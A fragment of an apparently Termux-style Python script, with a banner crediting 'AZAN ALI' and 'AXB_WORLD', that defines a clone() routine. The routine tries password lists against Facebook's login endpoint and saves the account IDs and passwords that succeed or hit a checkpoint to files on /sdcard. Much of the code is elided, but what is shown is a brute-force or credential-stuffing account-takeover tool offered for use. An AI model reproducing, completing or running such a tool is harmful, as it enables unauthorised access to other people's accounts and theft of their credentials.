...
\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹
\x1b[1;97m[+] 𝗔𝗨𝗧𝗛𝗢𝗥  :   AZAN ALI
\x1b[1;97m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :  Azan X. 
\x1b[1;97m[+] 𝗚𝗜𝗧𝗛𝗨𝗕  :   🅰🅽🅾🅽🆈🅼🅾🆄🆂
\x1b[1;97m[+] 𝗧𝗘𝗔𝗠    :   \33[1;42  AXB_WORLD\33[0m
...
def clone(id,pw,limit):
	...
	for pas in pw:
		...
		sys.stdout.flush()
		try:
			url = "https://www.facebook.com/login/device-based/regular/login/?refsrc"
			ro = requests.get('https://www.facebook.com').text
			...
			if "checkpoint" in r.text:
				...
				cp.append(id)
				open("/sdcard/AXB_cp.txt",'a').write(id+' - '+pas)
				break
			elif 'c_user' in r.text:
				print(f"{g}[CP] {id} | {pas}{s}")
				ok.append(id)
				open("/sdcard/AXB_ok.txt",'a').write(id+' - '+pas)
				break
			else:
				pass
		except:
